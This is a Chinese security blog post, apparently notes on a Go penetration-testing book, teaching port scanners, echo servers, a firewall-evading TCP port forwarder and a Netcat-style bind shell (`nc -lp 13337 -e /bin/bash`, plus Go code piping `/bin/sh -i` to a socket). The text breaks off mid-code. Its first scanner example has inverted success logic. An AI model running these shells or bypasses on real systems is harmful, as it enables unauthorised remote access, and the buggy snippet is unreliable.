<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>TCP、扫描器和代理 | N3bu74&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="Go黑帽子渗透测试编程之道一之TCP、扫描器和代理">
<meta name="author" content="
🙍‍♂️&nbsp;N3bu74">
<link rel="canonical" href="https://n3bu74.github.io/posts/sec/tcp-scanner-proxy/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.f5f7976b0695bcc912cd3f9e0715cf7d38944601dc8250a8f2f117625f16e974.css" integrity="sha256-9feXawaVvMkSzT&#43;eBxXPfTiURgHcglCo8vEXYl8W6XQ=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js" integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo="
        onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://n3bu74.github.io/img/N3bu74.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://n3bu74.github.io/img/N3bu74.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://n3bu74.github.io/img/N3bu74.png">
<link rel="apple-touch-icon" href="https://n3bu74.github.io/img/N3bu74.png">
<link rel="mask-icon" href="https://n3bu74.github.io/img/N3bu74.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>




<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = ""; 
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<meta property="og:title" content="TCP、扫描器和代理" />
<meta property="og:description" content="Go黑帽子渗透测试编程之道一之TCP、扫描器和代理" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://n3bu74.github.io/posts/sec/tcp-scanner-proxy/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-03T12:07:44+08:00" />
<meta property="article:modified_time" content="2023-02-03T12:07:44+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="TCP、扫描器和代理"/>
<meta name="twitter:description" content="Go黑帽子渗透测试编程之道一之TCP、扫描器和代理"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [

        {
          "@type": "ListItem",
          "position":  2 ,
          "name": "📚文章",
          "item": "https://n3bu74.github.io/posts/"
        },

        {
          "@type": "ListItem",
          "position":  3 ,
          "name": "💻 安全",
          "item": "https://n3bu74.github.io/posts/sec/"
        }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "TCP、扫描器和代理",
      "item": "https://n3bu74.github.io/posts/sec/tcp-scanner-proxy/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TCP、扫描器和代理",
  "name": "TCP、扫描器和代理",
  "description": "Go黑帽子渗透测试编程之道一之TCP、扫描器和代理",
  "keywords": [
    ""
  ],
  "articleBody": "1.TCP扫描 1.0 TCP握手机制 TCP中最重要的一点即三次握手，所谓tcp全连接扫描，tcp半连接扫描等都是依据三次握手的基础进行的，只不过是在握手的次数上有区别。简单来说三次握手分为下面三步：\n第一次握手：客户端发送syn包，表示通信开始\n第二次握手：服务端回复syn-ack作为相应，提示客户端以ack结束\n第三次握手：客户端发送ack，通信开始\n1.如果端口是开放的，则会进行3次握手。首先，客户端发送一个syn数据包，该数据包表示通信开始;然后，服务器以syn-ack进行响应，提示客户端以ack作为结束;之后就可以进行数据传输。\n2.如果端口关闭，则服务器会以一个rst数据包而不是syn-ack进行响应。\n3.如果流量被防火墙过滤，则客户端通常不会从服务器收到任何响应。\n1.1 单个端口扫描 package main import ( \"fmt\" \"net\" ) func main() { _, err := net.Dial(\"tcp\", \"www.baidu.com:80\") if err != nil { fmt.Println(\"Connection successful\") } else { fmt.Println(\"Connection failed\") } } 我们所使用的是Go的net包： Dial(network string, address string) (Conn, error)。\n第一个参数是一个字符串，用于标识要启动的连接的类型。可以是TCP、UNIX套接字、UDP和第4层协议的连接。\n第二个参数是告诉 Dial函数 你想要连接的主机。对于 IPv4/TCP连接，此字符串将使用 host:port 的形式。\n判断是否连接成功：Dial(network,address string）返回 Con 和 error ,如果连接成功, error 将为 nil。因此,要验证连接,只需要检查 error是否等于nil.\n1.2 非并发扫描 当我们要对多个端口扫描时，就要对端口进行枚举并拼接到 address中，这里就要将整数转换成字符串并拼接，或者直接格式化输出。\npackage main import ( \"fmt\" \"net\" ) func main() { for i := 1; i \u003c= 1024; i++ { address := fmt.Sprintf(\"127.0.0.1:%d\", i) conn, err := net.Dial(\"tcp\", address) if err != nil { fmt.Printf(\"Connect port:%d failed\\n\", i) continue } conn.Close() fmt.Printf(\"port:%d Open\\n\", i) } } 1.3 并发扫描 从上例扫描可知，扫描速度特慢，所以可以采取并发操作。\npackage main import ( \"fmt\" \"net\" ) func main() { for i := 1; i \u003c= 1024; i++ { go func(j int) { address := fmt.Sprintf(\"127.0.0.1:%d\", j) conn, err := net.Dial(\"tcp\", address) if err != nil { fmt.Printf(\"Connect port:%d failed\\n\", j) return } conn.Close() fmt.Printf(\"port:%d Open\\n\", j) }(i) } } 但是这里如果 直接使用 go 关键字，会为每个连接启动一个 goroutine 而主 goroutine 并不知道要等待连接发生。因此，代码会在for循环完成其迭代后立即完成并退出，这可能比代码与目标端口之间的数据包网络交换还要快。对于数据包仍在运行中的端口，可能无法获得其准确的结果，因此我们得采取一些方法解决这个问题。\n1.3.1 使用 WaitGroup 进行同步扫描 package main import ( \"fmt\" \"net\" \"sync\" \"time\" ) func main() { t := time.Now() var wg sync.WaitGroup for i := 1; i \u003c= 1024; i++ { wg.Add(1) go func(j int) { defer wg.Done() address := fmt.Sprintf(\"127.0.0.1:%d\", j) conn, err := net.Dial(\"tcp\", address) if err != nil { //fmt.Printf(\"Connect port:%d failed\\n\", j) return } conn.Close() fmt.Printf(\"port:%d Open\\n\", j) }(i) } wg.Wait() fmt.Println(time.Since(t)) } 该程序比初始版本有了进步，但仍然不算是正确的。如果对多个主机多次执行此程序，则可能会看到不一致的结果。同时扫描过多的主机或端口可能会导致网络或系统限制，造成结果不正确。你可以尝试将 1024 更改为 65535 并将目标服务器更改为本地主机 l27.0.0.1 ，结果可能会发生错误。如有需要，可以使用Wireshark或tcpdump查看打开这些连接的速度。\n1.3.2 使用人工池进行端口扫描 1.3.2.1 单通道通信 为避免结果不一致，我们需要使用 goroutine 池管理正在进行的并发工作。使用 for 循环创建一定数量的工人 goroutine 作为资源池；然后，在 main() 线程中使用通道提供工作。\n首先，创建一个新程序，该程序有 l00 个 worker ,使用一个 int 通道将它们打印到屏幕上。继续使用 WaitGroup 阻塞执行。\n函数 worker(ports chan int, * sync.WaitGroup) 有两个参数：int 类型的通道和指向 WaitGroup 的指针。通道用于接收工作，而WaitGroup则用于跟踪单个工作的完成情况。\npackage main import ( \"fmt\" \"sync\" ) func worker(ports chan int, wg *sync.WaitGroup) { for p := range ports { fmt.Println(p) wg.Done() } } func main() { ports := make(chan int, 100) // make 一个容量为 100 的缓冲通道 var wg sync.WaitGroup for i := 0; i \u003c cap(ports); i++ { //启动所需数量的工人线程,但这时工人尚未工作 go worker(ports, \u0026wg) } for i := 1; i \u003c= 1024; i++ { // 遍历端口送入通道 ports 中 wg.Add(1) ports \u003c- i } wg.Wait() close(ports) } 首先 make 一个容量为 100 的缓冲通道，这意味着可以在不等待接收器读取数据的情况下向其发送数据，同时缓冲通道也可以很好地用来维护和跟踪多个生产者和消费者的工作。\n接下来，使用 for 循环启动所需数量的工人线程，在函数 worker(ports chan int, * sync.WaitGroup)中，使用 range 连续地从通道 ports 接收数据，直到该通道被关闭。注意，这时工人尚未开始任何工作。在函数 main() 中依次遍历要扫描的端口送入通道 ports 中,然后将通道 ports 中的一个端口发送给工人。完成所有工作后，关闭通道 【close(ports)】。\n编写并执行该程序后，你会在屏幕上看到相应的数字。不过，你可能会注意到一个有趣的现象：数字不是以特定的顺序打印的。欢迎来到精彩的并行世界。\n结合端口扫描：\npackage main import ( \"fmt\" \"net\" \"sync\" ) func worker(ports chan int, wg *sync.WaitGroup) { for p := range ports { go func(j int) { defer wg.Done() address := fmt.Sprintf(\"127.0.0.1:%d\", j) conn, err := net.Dial(\"tcp\", address) if err != nil { //fmt.Printf(\"Connect port:%d failed\\n\", j) return } conn.Close() fmt.Printf(\"port:%d Open\\n\", j) }(p) } } func main() { ports := make(chan int, 100) var wg sync.WaitGroup for i := 0; i \u003c cap(ports); i++ { go worker(ports, \u0026wg) } for i := 1; i \u003c= 1024; i++ { wg.Add(1) ports \u003c- i } wg.Wait() close(ports) } 这样并发端口扫描器就可以正常工作，但是，打印到屏幕的端口将无法排序，因为该端口扫描器不会检查它们的顺序。\n1.3.2.2 多通道通信 要解决上面这个问题，你需要使用单独的线程将端口扫描的结果传回主线程，以便在打印之前对端口进行排序。这样修改的另一个好处是，可以完全消除对 WaitGroup 的依赖，因为我们将使用另一种跟踪完成情况的方法。例如，如果扫描1024个端口，则要在工人通道上发送1024次，并且需要将该工作的结果发送回主线程1024次。由于发送的工作单元数量和收到的结果数量相同，因此程序可以知道何时关闭通道并随后关闭工人线程。\npackage main import ( \"fmt\" \"net\" \"sort\" ) func worker(ports, results chan int) { for p := range ports { address := fmt.Sprintf(\"127.0.0.1:%d\", p) conn, err := net.Dial(\"tcp\", address) if err != nil { //fmt.Printf(\"Connect port:%d failed\\n\", j) results \u003c- 0 continue } conn.Close() results \u003c- p } } func main() { ports := make(chan int, 100) results := make(chan int) var openports []int for i := 0; i \u003c cap(ports); i++ { go worker(ports, results) } go func() { for i := 1; i \u003c= 1024; i++ { ports \u003c- i } }() for i := 1; i \u003c= 1024; i++ { port := \u003c-results if port != 0 { openports = append(openports, port) } } close(ports) close(results) sort.Ints(openports) for _, port := range openports { fmt.Printf(\"port:%d Open\\n\", port) } } 修改函数 worker(ports,.results chan int) 以接受两个通道。其余逻辑基本相同，不同之处在于：如果端口关闭，则将发送一个 0 ；如果端口处于打开状态，则将发送端口号。另外，创建一个单独的通道用于将结果从工人程序传递到主线程。然后，可以使用切片，存储结果，以便以后进行排序。接下来，需要单独使用一个 goroutine 把需要探测的端口号发送给工人，因为工人需要在结果收集循环前开始工作。\n结果收集循环在 results 通道上接收 1024 次。如果结果不等于 0 ，则会将其追加到切片。关闭通道后，使用 sort 对存储打开端口的切片进行排序。剩下的就是循环切片并将打开的端口打印到屏幕上。\n一个高效的端口扫描器就此实现。花一些时间处理代码，尤其是工人的数量。工人的数量越多，程序应执行得越快。但是，如果添加过多的工人，结果就可能会变得不可靠。当编写供其他人使用的工具时，你可以使用一个合理的默认值，以确保结果的可靠性。不过，你还应允许用户选择工人的数量。\n你可以对该程序进行一些改进。首先，为扫描的每个端口发送 results 通道，但你不必非得这么做；你还可以把代码写得复杂一点，因为它使用附加通道不仅是为了跟踪工人，而且为了能通过确保所有结果收集的完成来防止出现竞态条件。因为这是介绍性的一章，所以我们有意省略了这些内容。不过，不用担心，我们将在第3章中介绍这种模式。其次，你可能希望扫描器能够解析端口字符串，例如80、443、8080、21-25。如果要查看其实现，请参见https://github.com/blackhat-go/bhg/blob/master/ch-2/scanner-port-format/。我们将其作为练习供读者探索。\npackage portformat import ( \"errors\" \"strconv\" \"strings\" ) const ( porterrmsg = \"Invalid port specification\" ) // 处理 1-65535 类型，逐个添加到扫描的端口切片中 func dashSplit(sp string, ports *[]int) error { dp := strings.Split(sp, \"-\") if len(dp) != 2 { return errors.New(porterrmsg) } start, err := strconv.Atoi(dp[0]) if err != nil { return errors.New(porterrmsg) } end, err := strconv.Atoi(dp[1]) if err != nil { return errors.New(porterrmsg) } if start \u003e end || start \u003c 1 || end \u003e 65535 { return errors.New(porterrmsg) } for ; start \u003c= end; start++ { *ports = append(*ports, start) } return nil } // 将端口字符串转换成 int 类型，并添加到要扫描的端口切片中 func convertAndAddPort(p string, ports *[]int) error { i, err := strconv.Atoi(p) if err != nil { return errors.New(porterrmsg) } if i \u003c 1 || i \u003e 65535 { return errors.New(porterrmsg) } *ports = append(*ports, i) return nil } // Parse turns a string of ports separated by '-' or ',' and returns a slice of Ints. func Parse(s string) ([]int, error) { ports := []int{} if strings.Contains(s, \",\") \u0026\u0026 strings.Contains(s, \"-\") { sp := strings.Split(s, \",\") for _, p := range sp { if strings.Contains(p, \"-\") { if err := dashSplit(p, \u0026ports); err != nil { return ports, err } } else { if err := convertAndAddPort(p, \u0026ports); err != nil { return ports, err } } } } else if strings.Contains(s, \",\") { sp := strings.Split(s, \",\") for _, p := range sp { convertAndAddPort(p, \u0026ports) } } else if strings.Contains(s, \"-\") { if err := dashSplit(s, \u0026ports); err != nil { return ports, err } } else { if err := convertAndAddPort(s, \u0026ports); err != nil { return ports, err } } return ports, nil } 2.构造TCP代理 上一节主要介绍如何从客户端的角度使用net包，而本节将介绍使用它创建TCP服务器和传输数据的方法。 我们将首先介绍如何构建必要的回显服务器（该服务器仅回显给定响应到客户端），之后将介绍有关两个较为通用的程序的知识，即如何创建TCP端口转发器以及如何重新创建Netcat的“安全巨洞”用于远程命令执行。\n2.1 使用 io.Reader 和 io.Writer 要创建本节中的示例，无论你使用的是TCP、HTTP、文件系统还是任何其他方式，都需要使用两种类型：io.Reader 和 io.Writer 。对于所有输入/输出(I/O)任务来说，这两种数据类型都是必不可少的。它们是 Go 内置 io 包的一部分，是所有本地或网络数据传输的基础。这两种数据类型在 Go 的文档中定义如下。\ntype Reader interface { Read(p []byte) (n int, err error) } type Writer interface { Write(p []byte) (n int, err error) } 以上两种数据类型都被定义为接口，这意味着它们不能直接被实例化。而是有 某种数据类型实现上述的 Read 或 Write 方法，该 Read 或 Write 方法才能被视为 Reader 或 Writer\n例如，以下自定义的结构体类型 FooReader 可以满足约定，并且可以在任何接受 Reader 和 Writer 的地方使用。\ntype FooReader struct{} func (f *FooReader) Read(p []byte) (int, error) { // 从某处（任何地方）读取一些数据 return len(dataReadFromSomewhere), nil } func (f *FooReader) Write(p []byte) (int, error) { // 将数据写入某处 return len(dataReadFromSomewhere), nil } 参照上述示例，可以自定义包装了 stdin 和 stdout 的 Reader 和 Writer 。自从 Go 的 os.Stdin 和 os.Stdout 类型充当 Reader 和 Writer 以来，很多人编写过与此相关的代码，但如果你不时常重新造轮子，那么就可能学不到任何东西。\n结构体类型 FooWriter 和 FooReader 的完整实现:\npackage main import ( \"fmt\" \"log\" \"os\" ) // FooReader 定义了一个从标准输入 (stdin) 读取的 io.Reader. type FooReader struct{} // Read 从标准输入 (stdin) 读取数据 func (f *FooReader) Read(b []byte) (int, error) { fmt.Print(\"in \u003e \") return os.Stdin.Read(b) } // FooWriter 定义了一个写入标准输出 (stdout) 的 io.Writer type FooWriter struct{} // Write 将数据写入标准输出 (stdout) func (f *FooWriter) Write(b []byte) (int, error) { fmt.Print(\"out\u003e \") return os.Stdout.Write(b) } func main() { // 实例化 reader 和 writer var ( reader FooReader writer FooWriter ) // 创建缓冲区以保存输入/输出 input := make([]byte, 4096) // 使用 reader 读取输入 s, err := reader.Read(input) if err != nil { log.Fatalln(\"Unable to read data\") } fmt.Printf(\"Read %d bytes from stdin\\n\", s) // 使用 writer 写入输出 s, err = writer.Write(input) if err != nil { log.Fatalln(\"Unable to write data\") } fmt.Printf(\"Wrote %d bytes to stdout\\n\", s) } 将数据从 Reader 复制到 Writer 是一种非常常见的模式，这促使 Go 的 io 包中提供一个函数 Copy() ,该函数可用于简化函数 main() 。函数Copy()原型如下。\nfunc Copy(dst Writer, src Reader) (written int64, err error) 使用这个函数 Copy() 可以实现与以前相同的效果\npackage main import ( \"fmt\" \"io\" \"log\" \"os\" ) // FooReader defines an io.Reader to read from stdin. type FooReader struct{} // Read reads data from stdin. func (fooReader *FooReader) Read(b []byte) (int, error) { fmt.Print(\"in \u003e \") return os.Stdin.Read(b) } // FooWriter defines an io.Writer to write to Stdout. type FooWriter struct{} // Write writes data to Stdout. func (fooWriter *FooWriter) Write(b []byte) (int, error) { fmt.Print(\"out\u003e \") return os.Stdout.Write(b) } func main() { // Instantiate reader and writer. var ( reader FooReader writer FooWriter ) if _, err := io.Copy(\u0026writer, \u0026reader); err != nil { log.Fatalln(\"Unable to read/write data\") } } 注意，对 reader.Read([]byte) 和 writer.Write([]byte) 的显式调用已替换为对 io.Copy(writer,,reader) 的单个调用。背后的机制是 io.Copy(writer,reader) 调用提供的 reader 上的函数 Read([]byte) ,触发 FooReader 从 stdin 读取。随后， io.Copy(writer,reader) 在 writer 上调用函数 Wite([]byte) ,从而引起对 FooWriter 的调用，而 FooWriter 则将数据写入 stdout 。实际上，io.Copy(writer,reader) 按顺序处理先读后写的过程，而无须处理各种琐碎的细节。\n本部分内容绝不是对 Go 的 I/O 和接口的全面介绍。许多便捷函数以及自定义的 Reader 和 Writer 只是 Go 标准包的其中一个组成部分。大多数情况下，Go的标准包都包含所有用于完成最常见任务的基本实现。在下一节中，我们将探讨如何将这些基础知识应用到TCP通信中，以使你能开发一些实用工具。\n2.2 创建回显服务器 按照大多数语言的习惯，首先需要构建一个回显服务器，以学习如何在套接字中读写数据。为此，需要用到 net.Conn ( Go 的面向流的网络连接)，我们在构建端口扫描器时对此有过介绍。由 Go 的文档可知，Conn 实现了针对接口 Reader 和 Writer 定义的函数 Read([]byte) 和 Write([]byte) 。因此，Conn可以既是 Reader 又是 Writer 。从逻辑上讲这是合理的，因为 TCP 连接是双向的，可以用来发送（写入）或接收（读取）数据。\n创建 Conn 实例后，可以通过 TCP 套接字发送和接收数据。不过，TCP服务器不能简单地创建一个连接，连接必须由客户端发起建立。在 Go 中，首先可以使用 net.Listen(network,address string) 在特定端口上打开 TCP 监听器。客户端连接后，方法 Accept() 将创建并返回一个 Conn 对象，可以使用该对象接收和发送数据。\n实现回显服务器的完整示例:\npackage main import ( \"io\" \"log\" \"net\" ) // echo is a handler function that simply echoes received data. // echo 是一个处理（handler）函数,它仅回显接收到的数据 func echo(conn net.Conn) { defer conn.Close() // Create a buffer to store received data. // 创建一个缓冲区来存储接收到的数据 b := make([]byte, 512) for { // Receive data via conn.Read into a buffer. // 通过 conn.Read 接收数据到一个缓冲区 size, err := conn.Read(b[0:]) if err != nil \u0026\u0026 err != io.EOF { log.Println(\"Unexpected error\") break } if err == io.EOF \u0026\u0026 size == 0 { log.Println(\"Client disconnected\") break } log.Printf(\"Received %d bytes: %s\", size, string(b)) // Send data via conn.Write. // 通过 conn.Write 发送数据 log.Println(\"Writing data\") if _, err := conn.Write(b[0:size]); err != nil { log.Fatalln(\"Unable to write data\") } } } func main() { // Bind to TCP port 20080 on all interfaces. // 在所有接口上绑定 Tcp 端口 20080 listener, err := net.Listen(\"tcp\", \":20080\") if err != nil { log.Fatalln(\"Unable to bind to port\") } log.Println(\"Listening on 0.0.0.0:20080\") for { // Wait for connection. Create net.Conn on connection established. // 等待连接。在已建立的连接上创建 net.conn conn, err := listener.Accept() log.Println(\"Received connection\") if err != nil { log.Fatalln(\"Unable to accept connection\") } // Handle the connection. Using goroutine for concurrency. // 处理连接。使用 goroutine 实现并发 go echo(conn) } } 首先定义了一个名为 echo(net.Conn) 的函数，该函数接收 Conn 实例作为参数。它充当执行所有必要的 I/O 连接的处理程序。该函数使用缓冲从连接读取数据以及向连接写入数据，进行无限循环。数据会被读入一个名为 b 的变量中，再写回该连接。\n现在，需要设置一个监听器，该监听器将调用处理程序。如前所述，服务器无法建立连接，且必须监听来自客户端的连接请求。因此，使用 net.Listen(network,address string) 函数在所有接口上启用定义为绑定到 TCP 端口 20080 的监听器。\n接下来，无限循环确保即使己经收到一个连接，服务器仍将继续监听新的连接请求。在此循环中，调用 listener.Accept() 接受客户端的连接。当客户端连接成功时，此函数返回一个 Conn 实例。回想本节前面所述的内容，即 Conn 既是 Reader 也是 Writer ,它实现了 Read([]byte) 和 Write([]byte)方法。\n之后，将 Conn 实例传递给处理函数 echo(net.Conn)。该调用以关键字 go 开头，使其成为并发调用，以便在等待处理函数完成时其他连接不会阻塞。对于这样一个简单的回显服务器来说，执行以上操作可能并不容易。但我们之所以会花笔墨对其进行介绍是为了让你更好地理解 Go 并发模式的简单性。此时，有两个轻量级线程在同时运行。\n主线程循环返回并在 listener.Accept() 等待另一个连接时阻塞。 处理程序 goroutine 的执行己转移到函数 echo(net.Conn) ,继续运行并处理数据 这个回显服务器将客户端发送给它的内容完全重复地发回给客户端。可以看出这是一个简单、有用的例子。\n2.3 通过创建带缓冲的监听器来改进代码 上面的示例可以正常运行，但是依赖相当低级的函数调用、缓冲区跟踪以及重复的读/写。其运行过程很乏味且容易出错。不过， Go 还包含其他一些可以简化此过程并降低代码复杂性的包，具体来说，bufio 包包装了 Reader 和 Writer ,以创建 I/O缓冲机制。更新后的函数 echo（net.Conn）以及对此的详细讲解如下所示。\nfunc echo(conn net.Conn) { defer conn.Close() reader := bufio.NewReader(conn) s, err := reader.ReadString('\\n') if err != nil { log.Fatalln(\"Unable to read data\") } log.Printf(\"Received %d bytes: %s\", len(s), s) log.Println(\"Writing data\") writer := bufio.NewWriter(conn) if _, err := writer.WriteString(s); err != nil { log.Fatalln(\"Unable to write data\") } writer.Flush() } 不再是直接在 Conn 实例上调用函数 Read([]byte) 和 Write([]byte),而是通过 NewReader(io.Reader) 和 NewWriter(io.Writer) 初始化新的带缓冲的 Reader 和 Writer 。这些调用都以现有的 Reader 和 Writer 作为参数（记住，Conn类型实现了一些必要的功能，使其能同时被视为 Reader 和 Writer )。\n两个缓冲实例都具有用于读取和写入字符串数据的功能。ReadString([]byte) 带有一个分隔符，用于表示读取长度，而 WriteString([]byte) 则将字符串写入套接字。写入数据时，需要显式调用 writer.Flush() 以将所有数据写入底层的 writer (在这里为 Conn 实例)。\n尽管前面的示例通过使用缓冲的 I/O 简化了其运行过程，但是你还可以进一步简化此过程，要用到的就是便捷函数 Copy(Writer,Reader) 。如前所述，这个函数将 目标Writer 和 源Reader 作为参数，只需要从源复制到目标即可。\n在此示例中,将变量 conn 作为源和目标传递,因为将在建立的连接上回显内容。\nfunc echo(conn net.Conn) { defer conn.Close() // 使用 io.Copy() 将数据从 io.Reader 复制到 io.Writer if _, err := io.Copy(conn, conn); err != nil { log.Fatalln(\"Unable to read/write data\") } } 到这里你已经了解了 I/O 的基础知识并能将其应用于 TCP 服务器中。现在继续探索更多有用的相关示例。\n2.4 代理一个TCP客户端 通过端口转发绕过防火墙\n某些情况下，可以使用中间系统代理连接绕过或穿透防火墙从而避开这些限制，这种技术被称为端口转发。\n客户端通过防火墙连接到目标主机stacktitan.com。该主机配置为将连接转发到主机evil.com。尽管防火墙禁止直接连接到evil.com,但如果有了上面这样的配置，就可以使客户端绕过此保护机制去访问evil.com。\n现在你己经有了坚实的基础，可以利用所学的知识创建一个简单的端口转发器，以通过代理服务或主机代理建立连接。如本章前面所述，这对于尝试规避限制性出口控制或利用系统绕过网络分段很有用。\n在编写代码之前,请先思考下面这个虚构但现实的问题:\nJoe 在 ACME Inc.担任业务分析师一职，由于他的简历写得很漂亮，因此拿到了可观的薪水。不过，在工作中，他表现不佳，缺乏干劲。他把本该投入工作中的热情全部倾注到家里的猫身上。他在家里给猫安装了摄像头并建立了一个网站 joescatcam.website ,他可以通过它远程监视他的猫。但问题是 Joe 现在是为 ACME 工作。ACME 肯定不想让他一天24小时都在使用公司的网络带宽查看他的高清摄像头监控的关于猫的视频；ACME 甚至不让其他员工访问 Joe 创建的 joescatcam.website 网站。\nJoe 想到一个主意，即“如果我使用自己控制的基于互联网的系统构建一个端口转发器，是否可以强制将所有流量从那个主机重定向到 joescatcam.website 呢”。第二天， Joe 进行了测试并确认他可以访问位于 joesproxy.com 域的个人网站。Joe 本来应该参加当天下午召开的一个会议，但他没有参加，而是找了一家咖啡店并在那里迅速为他的问题开发了解决方案。他将把从 http://joesproxy.com 上收到的所有流量转发到 http://joescatcam.website 上。\n以下是 Joe 在 joesproxy.com 服务器上运行的代码。\npackage main import ( \"io\" \"log\" \"net\" ) func handler(src net.Conn) { dst, err := net.Dial(\"tcp\", \"joescatcam.website:80\") if err != nil { log.Fatalln(\"Unable to connect to our unreachable host\") } defer dst.Close() // 在 goroutine 中运行以防止 io.Copy 被阻塞 go func() { // 将源的输出复制到目标 if _, err := io.Copy(dst, src); err != nil { log.Fatalln(err) } }() // 将目标的输出复制回源 if _, err := io.Copy(src, dst); err != nil { log.Fatalln(err) } } func main() { // 在本地端口 80 上监听 listener, err := net.Listen(\"tcp\", \":80\") if err != nil { log.Fatalln(\"Unable to bind to port\") } for { conn, err := listener.Accept() if err != nil { log.Fatalln(\"Unable to accept connection\") } go handler(conn) } } 首先看 Joe 的 handle(net.Conn) 函数。 Joe 连接到 joescatcam.website （记住，无法从 Joe 公司的电脑直接访问此主机)。然后 Joe 分别使用两次 Copy(Writer,Reader)。第一个实例确保将来自入站连接的数据复制到 joescatcam.website 连接。第二个实例确保从 joescatcam.website 读取的数据被写回到连接客户端的连接中。因为 Copy(Writer,Reader) 是一个阻塞函数，并且将继续阻塞执行直到关闭网络连接，所以 Joe 明智地将他 Copy(Writer,Reader) 的第一次调用包装在新的 goroutine 中。这样 handle(net.Conn) 函数中的执行就得以继续进行，并且可以进行第二 Copy(Writer,Reader) 调用。\nJoe 的代理在端口80上监听并中继连接到 joescatcam.website:80 收发的所有数据。Joe 确认他可以使用 curl 通过 joesproxy.com 连接到 joescatcam.website。比如 curl -i -X GET http://joesproxy.com 2.5 复现 Netcat 命令执行 在本节中，我们将复现 Netcat 的一些很有趣的功能，特别是它的“安全巨洞”功能。 Netcat 是 TCP/IP 上的“瑞士军刀”。其本质上属于 Telnet 的一种，只不过比起 Telnet,它更灵活且可编写脚本。它包含一项在 TCP 上重定向任意程序的标准输入(stdi)和标准输出(stdout)的功能，例如使攻击者能够通过单一命令执行漏洞访问操作系统的 shell 。可参考以下命令。\nnc -lp 13337 -e /bin/bash 该命令在端口 13337 上创建了一个监听器。任何可能通过 Telnet 连接的远程客户端都可以执行任意 bash 命令，因此这被称为“安全巨洞”。Netcat 允许你在程序编译期间根据需要添加此功能（在标准Linuⅸ版本上找到的大多数 Netcat 二进制文件都不包含此功能)。接下来，我们将向你展示如何在 Go 中创建它。\n首先，查看 Go 的 os/exec 包。我们将使用它运行操作系统命令。该包定义了一种名为 Cmd 的类型，其中包含运行命令以及操作 stdin 和 stdout 所需的方法和属性。这里把 stdin(一个Reader) 和 stdout((一个Writer) 重定向到 Conn 实例（既是Reader又是Writer)。\n接收到新的连接后，可以使用 os/exec 中的函数 Command(name string,arg…string) 创建新的 Cmd 实例。该函数使用操作系统命令及其任何选项作为参数。在此示例中，将 /bin/sh 硬编码为命令并将 -i 作为参数，以使我们处于交互模式，这样就可以更可靠地操作 stdin 和 stdout 。\ncmd := exec.Command(\"/bin/sh\",\"-i\") 这将创建 Cmd 的实例，但尚未执行命令。可以使用两个选项操作 stdin 和 stdout 。你可以使用前面讨论的 Copy(Writer,Reader) 或直接将 Reader 和 Writer 赋给 Cmd.这里直接将 Conn 对象赋给 cmd.Stdin 和 cmd.Stdout ,如下所示。\ncmd.Stdin = conn cmd.Stdout = conn 完成命令和数据流处理的设置之后，就可以使用 cmd.Run() 运行命令。\nif err := cmd.Run(); err != nil { // 处理错误 } 以上操作很适合在 Linux 系统上运行。但是，在 Windows 系统上运行程序时，若使用 cmd.exe 而不使用 /bin/bash ,你会发现由于某些 Windows 特定的匿名管道处理，连接的客户端永远不会收到命令输出。解决此问题有两种方案。\n首先，可以通过调整代码显式强制刷新标准输出以适应此细微差别。不再是直接将 Conn 赋给 cmd.Stdout ,而是实现一个包装 bufo.Writer(一个缓冲写入器)的自定义 Writer 并显式调用其 Flush 方法以强制刷新该缓冲区。\n以下是自定义的 writer 和 Flusher。\n// Flusher 包装 bufio.Writer，显式刷新所有写入 type Flusher struct { w *bufio.Writer } // NewFlusher 从 io.Writer创建一个新的 Flusher func NewFlusher(w io.Writer) *Flusher { return \u0026Flusher{ w: bufio.NewWriter(w), } } // 写入数据并显式刷新缓冲区 func (f *Flusher) Write(b []byte) (int, error) { count, err := f.w.Write(b) if err != nil { return -1, err } if err := f.w.Flush(); err != nil { return -1, err } return count, err } 类型 Flusher 实现了函数 Write([] byte) ，该函数将数据写入底层的缓冲 writer ,然后刷新输出。\n使用自定义 writer 的实现，可以调整连接处理程序以实例化此 Flusher 自定义数据类型并将其用于 cmd.Stdout。\nfunc handler(conn net.Conn) { // 显式调用 /bin/sh 并使用 -i 进入交互模式 // 这样我们就可以用它作为标准输入和标准输出 // 对于 Windows 使用 exec.Command(\"cmd.exe\") cmd := exec.Command(\"/bin/sh\", \"-i\") // 将标准输入设置为我们的连接 cmd.Stdout = conn // 从连接创建一个 Flusher 用于标准输出 // 